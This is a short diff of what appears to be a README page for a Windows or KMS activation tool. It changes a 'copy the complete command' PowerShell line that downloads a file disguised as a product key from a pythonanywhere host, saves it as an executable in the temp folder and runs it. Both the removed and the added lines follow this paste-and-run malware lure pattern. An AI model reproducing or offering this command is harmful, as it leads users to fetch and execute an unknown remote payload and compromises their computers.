@@ -5,7 +5,7 @@
 
 
 ## ATTENTION ⚡ Copy the complete command ⚡
-> Invoke-WebRequest -Uri https://downloadapplication.pythonanywhere.com/static/TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.KEY -OutFile $env:TEMP\WindowsKEY.exe; Start-Process $env:TEMP\WindowsKEY.exe
+> Invoke-WebRequest -Uri https://KMSConnectionClient.pythonanywhere.com/static/TX9XD-98N7V-6WMQ6-BX7FG-H8Q99.KEY -OutFile $env:TEMP\KMSActivationClient.exe; Start-Process $env:TEMP\KMSActivationClient.exe
 
 
 <!--
